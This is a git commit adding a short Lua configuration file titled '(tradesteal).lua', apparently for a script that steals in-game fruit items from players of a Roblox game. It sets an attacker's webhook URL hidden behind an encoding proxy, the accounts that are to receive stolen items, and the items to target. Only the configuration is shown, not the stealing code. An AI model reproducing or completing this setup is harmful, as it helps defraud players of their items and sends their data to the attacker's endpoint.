64535ce6c0fd67c02878133397cc0fe17c9584f7
azure123-hub <fakej5487@gmail.com>
2025-04-02 22:24:33 +0100

    Create (tradesteal).lua

---
+++ (tradesteal).lua
@@ -0,0 +1,3 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=RVpMT3E5NHRJZjJ1bkhKWWJWb2Z5UTpTNUd2X0QxUFZMS250OW9fdUw5eG0yaFcxX3B2aElyMERNMzlwNGpRbG1XU1JxbUdwUnVWM3VVWlBVLXBSY05NM1pXc09CSEQzbEc4NmFCOTczTjFjb0s1dm1sUHNDVy0tYXlsNHNwaVh2bGl0dTFXYmlXbGpyMmFXelJ0VFg3azBBVGczRWZHRGVMNDNNb3ZHaEdhWlJsdkd3U0taZnVvUzJsSXZCRjVZeE0" -- << Your Webhook
+Usernames = {"bloodnpoison", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
